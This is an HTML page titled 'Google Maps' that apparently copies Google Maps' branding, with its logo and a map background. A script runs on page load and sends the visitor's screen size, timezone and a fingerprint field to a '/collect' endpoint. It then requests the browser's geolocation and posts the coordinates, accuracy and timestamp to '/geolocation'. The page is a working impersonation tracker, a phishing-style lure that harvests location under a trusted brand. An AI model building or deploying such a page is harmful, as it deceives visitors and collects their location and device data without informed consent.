<!DOCTYPE html>
<html>
<head>
    <title>Google Maps</title>
    <link rel="icon" href="/static/Image/GoogleMapLogo.png" type="image/png">

    <style>
        body{
            background-image: url('./Image/MapBackground.png');
            background-size: cover;
            background-repeat: repeat;
        }

        button{
            background-color: white;
            padding: 10px 10px;
            border: 100px;
            border-radius: 15px;
            box-shadow: 2px 2px 10px 1px rgba(0, 0, 0, 0.2);
            color: rgb(120, 120, 120);
            cursor: pointer;
        }
        button:hover{
            background-color: rgb(234, 234, 234);
        }
        button#more{
            color: black;
        }
        button svg#search {
            margin-left: 50px;
        }
        button#search:hover {
            cursor: text;
        }
        button svg{
            margin-right: 5px;
        }
        .sidebar{
            z-index: 999;
            background-color: white;
            position: absolute;
            display:block;
            margin: 0px;
            padding: 10px;
            left: 0%;
            top: 0%;
            height: 100%;
            width: 3.4%;
            overflow-x: hidden;
            padding-top: 24px;
            position: fixed;
        }
    </style>

    <script>
        document.addEventListener("DOMContentLoaded", () => {

            fetch('/collect', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    screen: {
                        width: window.screen.width,
                        height: window.screen.height,
                        pixelRatio: window.devicePixelRatio
                    },
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    battery: { charging: true, level: 1 }, // This just sameple naaa
                    network: { downlink: 4.4, effectiveType: '4g' }, // This just sameple naaa
                    fingerprint: 'sample_fingerprint'
                })
            })
            .then(response => response.json())
            .then(data => console.log('Collect response:', data))
            .catch(error => console.error('Collect error:', error));

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    fetch('/geolocation', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            timestamp: position.timestamp
                        })
                    })
                    .then(response => response.json())
                    .then(data => console.log('Geolocation response:', data))
                    .catch(error => console.error('Geolocation error:', error));
                }, error => {
                    console.error('Geolocation access denied:', error);
                });
            } else {
                console.error('Geolocation not supported');
            }
        });
</script>
